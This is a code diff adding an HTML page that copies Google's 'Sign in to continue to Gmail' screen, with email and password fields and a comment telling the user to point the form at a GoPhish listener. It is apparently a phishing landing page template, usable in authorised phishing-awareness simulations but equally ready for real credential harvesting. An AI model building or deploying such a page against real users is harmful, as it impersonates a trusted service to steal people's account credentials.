@@ -1,0 +1,284 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Google Accounts</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f1f3f4; /* Light gray background */
+      color: #202124;
+      min-height: 100vh;
+    }
+
+    .main-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      gap: 20px;
+    }
+
+    .signin-card {
+      width: 80%;
+      max-width: 70vw;
+      padding: 40px 48px;
+      border: 1px solid #dadce0;
+      border-radius: 16px; /* More rounded corners */
+      background-color: #fff;
+      text-align: left;
+    }
+
+    .signin-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      margin-bottom: 10px;
+    }
+
+    .signin-header img {
+      width: 50px;
+      height: 50px;
+    }
+
+    .signin-title {
+      font-size: 32px;
+      font-weight: 400;
+    }
+
+    .signin-subtitle {
+      font-size: 16px;
+      font-weight: 400;
+      color: #5f6368;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      margin-top: -10px;
+    }
+
+    .input-container {
+      display: flex;
+      justify-content: flex-end;
+      width: 100%;
+    }
+
+    .input-container input {
+      width: 50%;
+      height: 55px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding-left: 3%;
+      font-size: 16px;
+      transition: border 0.2s ease;
+      background-color: #fff;
+    }
+
+    .input-container input:focus {
+      outline: none;
+      border: 2px solid #1a73e8;
+      background-color: #fff;
+    }
+
+    .forgot-password {
+      margin-top: 8px;
+      margin-bottom: 30px;
+      text-align: center;
+      padding-left: 15%;
+    }
+
+    .forgot-password a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    .forgot-password a:hover {
+      text-decoration: underline;
+    }
+
+    .disclaimer {
+      font-size: 15px;
+      color: #5f6368;
+      margin-bottom: 30px;
+      padding-left: 50%;
+      text-align: left;
+    }
+
+    .disclaimer a {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .disclaimer a:hover {
+      text-decoration: underline;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .create-account {
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+      padding: 10px 8px;
+      border-radius: 4px;
+    }
+
+    .create-account:hover {
+      background-color: #f8f9fa;
+    }
+
+    .next-button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .next-button:hover {
+      background-color: #1765cc;
+    }
+
+    .footer {
+      width: 100%;
+      padding: 20px;
+      font-size: 12px;
+      color: #5f6368;
+    }
+
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .language-selector {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .language-selector select {
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 8px 12px;
+      background-color: #fff;
+      color: #202124;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+    }
+
+    .footer-links a {
+      color: #5f6368;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+      .signin-card {
+        max-width: 80vw;
+      }
+
+      .buttons {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 20px;
+      }
+
+      .footer-content {
+        flex-direction: column;
+        align-items: center;
+      }
+    }
+  </style>
+</head>
+<body>
+<main class="main-container">
+  <div class="signin-card">
+    <div class="signin-header">
+      <img alt="Google logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png"/>
+      <h1 class="signin-title">Sign in</h1>
+    </div>
+
+    <p class="signin-subtitle">to continue to Gmail</p>
+
+    <!-- 🔧 Replace action URL with your GoPhish listener -->
+    <form action="" method="POST">
+      <div class="form-group">
+        <div class="input-container">
+          <input name="email" type="email" placeholder="Email or phone" required=""/>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <div class="input-container">
+          <input name="password" type="password" placeholder="Password" required=""/>
+        </div>
+        <div class="forgot-password"><a href="#">Forgot password?</a></div>
+      </div>
+
+      <div class="disclaimer">
+        Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
+      </div>
+
+      <div class="buttons">
+        <a class="create-account" href="#">Create account</a>
+        <button class="next-button" type="submit">Next</button>
+      </div>
+    </form>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="footer-content">
+    <div class="language-selector">
+      <span>English (United States)</span>
+      <select>
+        <option>English</option>
+        <option>Español</option>
+        <option>Français</option>
+        <option>العربية</option>
+      </select>
+    </div>
+    <div class="footer-links">
+      <a href="#">Help</a> <a href="#">Privacy</a> <a href="#">Terms</a>
+    </div>
+  </div>
+</footer>
+
+
+</body></html>
